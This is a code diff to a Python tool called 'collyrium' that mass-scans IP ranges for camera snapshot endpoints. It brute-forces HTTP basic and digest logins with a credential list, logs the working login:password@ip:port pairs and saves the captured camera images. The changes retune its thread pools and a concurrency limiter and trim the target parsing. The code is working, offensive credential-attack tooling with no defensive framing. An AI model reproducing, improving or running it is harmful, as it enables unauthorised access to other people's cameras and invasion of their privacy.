@@ -42,8 +42,10 @@ SNAPSHOT_PATHS = [
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 HTTP_TIMEOUT = 2
 SOCKET_TIMEOUT = 1
-PATH_PARALLEL_WORKERS = 128
-CRED_PARALLEL_WORKERS = 256
+
+PATH_PARALLEL_WORKERS = 1
+CRED_PARALLEL_WORKERS = 1
+active_brute_limiter = None 
 
 stop_event = threading.Event()
 interrupted_by_user = False
@@ -99,10 +101,7 @@ def is_valid_image_and_ext(data, content_type):
 
 def log_error(msg):
     with progress_lock:
-        if '\n' in msg:
-            sys.stderr.write(f"[!] {msg}\n")
-        else:
-            sys.stderr.write(f"[!] {msg}\n")
+        sys.stderr.write(f"[!] {msg}\n")
 
 def load_list(filepath, allow_empty=False):
     if not os.path.isfile(filepath):
@@ -180,13 +179,10 @@ def check_path(ip, port, path):
                 if k.lower() == 'www-authenticate':
                     auth_header = v
                     break
-            if 'digest' in auth_header.lower():
-                auth_type = 'digest'
-            else:
-                auth_type = 'basic'
+            auth_type = 'digest' if 'digest' in auth_header.lower() else 'basic'
             return auth_type, path, True
         return None, None, False
-    except Exception:
+    except:
         return None, None, False
 
 def try_cred(ip, port, auth_type, auth_path, login, password):
@@ -205,73 +201,47 @@ def try_cred(ip, port, auth_type, auth_path, login, password):
         if resp.status_code == 200 and len(resp.content) > 50:
             return login, password, resp.content, resp.headers.get('Content-Type', ''), True
         return None, None, None, None, False
-    except Exception:
+    except:
         return None, None, None, None, False
 
 def process_target(ip, port, creds, output_path):
     if stop_event.is_set():
         return False
-        
-    if not is_port_open(ip, port, timeout=SOCKET_TIMEOUT):
+    if not is_port_open(ip, port):
         return False
 
-    path_futs = []
-    with ThreadPoolExecutor(max_workers=PATH_PARALLEL_WORKERS) as path_pool:
-        for path in SNAPSHOT_PATHS:
-            path_futs.append(path_pool.submit(check_path, ip, port, path))
-        
-        auth_type = None
-        auth_path = None
-        
-        for fut in as_completed(path_futs):
-            if stop_event.is_set():
-                return False
-            at, ap, success = fut.result()
-            if success:
-                auth_type = at
-                auth_path = ap
-                for other_fut in path_futs:
-                    if other_fut != fut:
-                        other_fut.cancel()
-                break
-
-    if auth_type is None or auth_path is None:
-        return False
-
-    cred_futs = []
-    with ThreadPoolExecutor(max_workers=CRED_PARALLEL_WORKERS) as cred_pool:
-        for login, password in creds:
-            cred_futs.append(cred_pool.submit(try_cred, ip, port, auth_type, auth_path, login, password))
-        
-        found_cred = False
-        for fut in as_completed(cred_futs):
-            if stop_event.is_set():
-                return False
-            login, password, data, content_type, success = fut.result()
-            if success:
-                cred_line = f"{login}:{password}@{ip}:{port}"
-                results_path = os.path.join(output_path, "results.txt")
-                with open(results_path, "a", encoding='utf-8') as f:
-                    f.write(cred_line + "\n")
-                
-                ext = is_valid_image_and_ext(data, content_type)
-                if ext:
-                    safe_filename = f"{login}_{password}_{ip}_{port}".replace(":", "_").replace("/", "_").replace("\\", "_")
-                    snap_path = os.path.join(output_path, "snapshots", f"{safe_filename}.{ext}")
-                    try:
-                        with open(snap_path, "wb") as f:
-                            f.write(data)
-                    except Exception:
-                        pass
-                
-                for other_fut in cred_futs:
-                    if other_fut != fut:
-                        other_fut.cancel()
-                
-                found_cred = True
-                break
+    auth_type, auth_path = None, None
     
-    return found_cred
+    with active_brute_limiter:
+        with ThreadPoolExecutor(max_workers=PATH_PARALLEL_WORKERS) as path_pool:
+            path_futs = [path_pool.submit(check_path, ip, port, p) for p in SNAPSHOT_PATHS]
+            for fut in as_completed(path_futs):
+                at, ap, success = fut.result()
+                if success:
+                    auth_type, auth_path = at, ap
+                    break
+        
+        if not auth_type:
+            return False
+
+        with ThreadPoolExecutor(max_workers=CRED_PARALLEL_WORKERS) as cred_pool:
+            cred_futs = [cred_pool.submit(try_cred, ip, port, auth_type, auth_path, l, p) for l, p in creds]
+            for fut in as_completed(cred_futs):
+                login, password, data, content_type, success = fut.result()
+                if success:
+                    cred_line = f"{login}:{password}@{ip}:{port}"
+                    with open(os.path.join(output_path, "results.txt"), "a", encoding='utf-8') as f:
+                        f.write(cred_line + "\n")
+                    
+                    ext = is_valid_image_and_ext(data, content_type)
+                    if ext:
+                        safe_filename = f"{login}_{password}_{ip}_{port}".replace(":", "_").replace("/", "_").replace("\\", "_")
+                        try:
+                            with open(os.path.join(output_path, "snapshots", f"{safe_filename}.{ext}"), "wb") as f:
+                                f.write(data)
+                        except: pass
+                    return True
+    return False
 
 def signal_handler(sig, frame):
     global interrupted_by_user, suppress_final_progress
@@ -289,6 +259,7 @@ def iter_targets(ip_port_map):
 
 def main():
     global ip_port_map, ip_completed, total_unique_ips, scanned_ips, suppress_final_progress
+    global PATH_PARALLEL_WORKERS, CRED_PARALLEL_WORKERS, active_brute_limiter
     
     parser = argparse.ArgumentParser(add_help=False)
     parser.add_argument('-i', type=str)
@@ -313,143 +284,68 @@ def main():
         print("-t [Threads number (Default=512)]")
         print("-? [Help]")
         return
+
+    total_threads = max(1, args.t)
+    max_active_cameras = max(1, int(total_threads * 0.3 / 10))
+    if max_active_cameras < 1: max_active_cameras = 1
+    active_brute_limiter = threading.Semaphore(max_active_cameras)
     
+    PATH_PARALLEL_WORKERS = max(4, int((total_threads * 0.2) / max_active_cameras))
+    CRED_PARALLEL_WORKERS = max(8, int((total_threads * 0.3) / max_active_cameras))
+
     input_path = args.i
     output_path = args.o
-    threads = max(1, args.t)
-    
+    threads = total_threads
+
     if not os.path.isfile(input_path):
         log_error(f"Input file: {input_path} not found!")
         return
-    
+
     config_dir = os.path.join(os.path.dirname(__file__), "config")
-    creds_file = os.path.join(config_dir, "creds.cfg")
-    ports_file = os.path.join(config_dir, "ports.cfg")
-    
-    creds = load_creds(creds_file)
-    ports = load_ports(ports_file)
-    
+    creds = load_creds(os.path.join(config_dir, "creds.cfg"))
+    ports = load_ports(os.path.join(config_dir, "ports.cfg"))
+
     with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
         raw_lines = f.readlines()
-    
-    ip_port_map = {}
+
     unique_ips = set()
-    parsed_count = 0
-    error_count = 0
-    
-    for line_num, line in enumerate(raw_lines, 1):
+    for line in raw_lines:
         line = line.strip()
-        if not line or line.startswith('#'):
-            continue
-        
+        if not line or line.startswith('#'): continue
         try:
-            line = ' '.join(line.split())
-            if ':' in line and '/' not in line and '-' not in line:
-                parts = line.split(':')
-                if len(parts) == 2:
-                    ip_part = parts[0].strip()
-                    port_part = parts[1].strip()
-                    
-                    ipaddress.IPv4Address(ip_part)
-                    ip = ip_part
-                    
-                    port = int(port_part)
-                    if not (1 <= port <= 65535):
-                        log_error(f"Line {line_num}: Port out of range in '{line}'")
-                        error_count += 1
-                        continue
-                    
-                    unique_ips.add(ip)
-                    if ip not in ip_port_map:
-                        ip_port_map[ip] = set()
-                    ip_port_map[ip].add(port)
-                    parsed_count += 1
-                    continue
-            
-            elif '/' in line and ':' not in line and '-' not in line:
-                try:
-                    network = ipaddress.ip_network(line, strict=False)
-                    for ip_obj in network.hosts():
-                        ip = str(ip_obj)
-                        unique_ips.add(ip)
-                        if ip not in ip_port_map:
-                            ip_port_map[ip] = set()
-                        ip_port_map[ip].update(ports)
-                    parsed_count += 1
-                    continue
-                except ValueError as e:
-                    log_error(f"Line {line_num}: Invalid CIDR '{line}' - {e}")
-                    error_count += 1
-                    continue
-            
-            elif '-' in line and line.count('-') == 1 and ':' not in line and '/' not in line:
-                try:
-                    start_ip, end_ip = line.split('-')
-                    start_ip = start_ip.strip()
-                    end_ip = end_ip.strip()
-                    
-                    start = ipaddress.IPv4Address(start_ip)
-                    end = ipaddress.IPv4Address(end_ip)
-                    
-                    current_ip = start
-                    while current_ip <= end:
-                        ip = str(current_ip)
-                        unique_ips.add(ip)
-                        if ip not in ip_port_map:
-                            ip_port_map[ip] = set()
-                        ip_port_map[ip].update(ports)
-                        current_ip += 1
-                    
-                    parsed_count += 1
-                    continue
-                except ValueError as e:
-                    log_error(f"Line {line_num}: Invalid IP range '{line}' - {e}")
-                    error_count += 1
-                    continue
-            
+            if '/' in line:
+                net = ipaddress.ip_network(line, strict=False)
+                for ip_obj in net.hosts():
+                    ip_s = str(ip_obj)
+                    unique_ips.add(ip_s)
+                    ip_port_map.setdefault(ip_s, set()).update(ports)
+            elif '-' in line:
+                s, e = line.split('-')
+                start, end = ipaddress.IPv4Address(s.strip()), ipaddress.IPv4Address(e.strip())
+                curr = start
+                while curr <= end:
+                    ip_s = str(curr)
+                    unique_ips.add(ip_s)
+                    ip_port_map.setdefault(ip_s, set()).update(ports)
+                    curr += 1
+            elif ':' in line:
+                ip_p, port_p = line.split(':')
+                unique_ips.add(ip_p)
+                ip_port_map.setdefault(ip_p, set()).add(int(port_p))
             else:
-                try:
-                    ipaddress.IPv4Address(line)
-                    ip = line
-                    unique_ips.add(ip)
-                    if ip not in ip_port_map:
-                        ip_port_map[ip] = set()
-                    ip_port_map[ip].update(ports)
-                    parsed_count += 1
-                    continue
-                except ValueError:
-                    if '.' in line and not any(c.isalpha() for c in line.replace('.', '')):
-                        log_error(f"Line {line_num}: Invalid IP format '{line}'")
-                        error_count += 1
-                        continue
-                    else:
-                        log_error(f"Line {line_num}: Unsupported format '{line}'")
-                        error_count += 1
-                        continue
-                        
-        except Exception as e:
-            log_error(f"Line {line_num}: Unexpected error parsing '{line}' - {e}")
-            error_count += 1
-            continue
-    
-    for ip in ip_port_map:
-        if not ip_port_map[ip]:
-            ip_port_map[ip].update(ports)
-    
+                ipaddress.IPv4Address(line)
+                unique_ips.add(line)
+                ip_port_map.setdefault(line, set()).update(ports)
+        except: continue
+
     total_unique_ips = len(unique_ips)
-    ip_completed = {ip: set() for ip in ip_port_map}
-    
     if total_unique_ips == 0:
-        log_error("No valid targets generated!")
+        log_error("No valid targets!")
         return
-    
-    if error_count > 0:
-        safe_print(f"[!] Failed to parse {error_count} lines")
-    
-    target_iter = iter_targets(ip_port_map)
+
     os.makedirs(output_path, exist_ok=True)
     os.makedirs(os.path.join(output_path, "snapshots"), exist_ok=True)
-    
+
     safe_print("[~] collyrium")
     safe_print(f"[+] Input: {input_path}")
     safe_print(f"[+] Output: {output_path}")
@@ -457,94 +353,49 @@ def main():
     safe_print(f"[+] Credentials - {len(creds)}")
     safe_print(f"[+] Hosts: {total_unique_ips}")
     print()
-    
+
     signal.signal(signal.SIGINT, signal_handler)
     if os.name == 'nt':
         signal.signal(signal.SIGBREAK, signal_handler)
-    
+
+    target_iter = iter_targets(ip_port_map)
     found = 0
-
-    def update_ip_completion(ip, port):
-        global scanned_ips
-        with ip_lock:
-            if ip in ip_completed:
-                ip_completed[ip].add(port)
-                if ip_completed[ip] == ip_port_map[ip]:
-                    scanned_ips += 1
-
-    max_outstanding = max(threads * 2, 6) 
     running = set()
     fut_to_target = {}
     last_update = 0.0
-    
+
     with ThreadPoolExecutor(max_workers=threads) as executor:
         def submit_next():
             try:
                 ip, port = next(target_iter)
-            except StopIteration:
-                return False
-            fut = executor.submit(process_target, ip, port, creds, output_path)
-            running.add(fut)
-            fut_to_target[fut] = (ip, port)
-            return True
+                fut = executor.submit(process_target, ip, port, creds, output_path)
+                running.add(fut)
+                fut_to_target[fut] = (ip, port)
+                return True
+            except StopIteration: return False
 
-        for _ in range(min(max_outstanding, total_unique_ips)):
-            if not submit_next():
-                break
+        for _ in range(min(threads * 2, total_unique_ips)):
+            if not submit_next(): break
 
         while running and not stop_event.is_set():
             done, _ = wait(running, timeout=0.05, return_when=FIRST_COMPLETED)
-            
-            if not done:
-                now = time.time()
-                if now - last_update >= 0.1 and not interrupted_by_user:
-                    print_progress_once(scanned_ips, found, total_unique_ips)
-                    last_update = now
-                continue
-
             for fut in done:
                 running.discard(fut)
                 ip_port = fut_to_target.pop(fut, (None, None))
-                ip, port = ip_port
-                
                 try:
-                    res = fut.result()
-                    if res:
-                        found += 1
-                except Exception:
-                    pass
-                
-                if ip is not None:
-                    update_ip_completion(ip, port)
-                
-                if not stop_event.is_set():
-                    submit_next()
-
+                    if fut.result(): found += 1
+                except: pass
+                if ip_port[0]:
+                    with ip_lock:
+                        ip_completed.setdefault(ip_port[0], set()).add(ip_port[1])
+                        if ip_completed[ip_port[0]] == ip_port_map[ip_port[0]]:
+                            scanned_ips += 1
+                submit_next()
+            
             now = time.time()
             if now - last_update >= 0.1 and not interrupted_by_user:
                 print_progress_once(scanned_ips, found, total_unique_ips)
                 last_update = now
-
-        if stop_event.is_set():
-            for fut in running:
-                try:
-                    fut.cancel()
-                except:
-                    pass
-            running.clear()
-
-        if running and not stop_event.is_set():
-            for fut in as_completed(list(running)):
-                ip_port = fut_to_target.get(fut, (None, None))
-                ip, port = ip_port
-                try:
-                    res = fut.result()
-                    if res:
-                        found += 1
-                except:
-                    pass
-                if ip is not None:
-                    update_ip_completion(ip, port)
 
     if not suppress_final_progress:
         safe_print('\r' + format_progress(scanned_ips, found, total_unique_ips), end='\n', flush=True)
@@ -553,8 +404,7 @@ def main():
         safe_print("[*] Scanning complete! Stopping...")
     
     end_time = time.strftime("%d.%m.%Y %H:%M:%S", time.localtime())
-    results_path = os.path.join(output_path, "results.txt")
-    with open(results_path, "a", encoding='utf-8') as f:
+    with open(os.path.join(output_path, "results.txt"), "a", encoding='utf-8') as f:
         f.write(f"\n# Scan finished: {end_time}\n")
         f.write(f"# Hosts found: {found}\n")
 
